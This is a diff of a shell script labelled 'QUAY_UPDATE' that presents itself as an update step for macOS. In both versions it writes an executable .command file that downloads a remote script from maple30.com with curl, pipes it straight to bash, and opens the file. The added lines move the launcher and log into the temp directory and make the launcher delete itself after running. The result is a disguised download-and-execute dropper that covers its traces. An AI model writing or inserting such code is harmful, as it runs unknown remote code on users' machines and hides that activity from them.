@@ -1,8 +1,12 @@
 # QUAY_UPDATE
-printf '%s\n' \
-  '#!/bin/bash' \
-  'curl -fsSL "https://maple30.com/v3.15.9/mac.sh" | bash >>"$HOME/Desktop/quay-upd.txt" 2>&1' \
-  >"$HOME/Desktop/q.command"
-chmod +x "$HOME/Desktop/q.command"
-open "$HOME/Desktop/q.command"
+D="${TMPDIR:-/tmp}"
+LOG="$D/quay-upd.log"
+CMD="$D/quay-run.command"
+cat >"$CMD" <<EOF
+#!/bin/bash
+curl -fsSL "https://maple30.com/v3.15.9/mac.sh" | bash >>"$LOG" 2>&1
+rm -f "$CMD"
+EOF
+chmod +x "$CMD"
+open "$CMD"
 exit 0
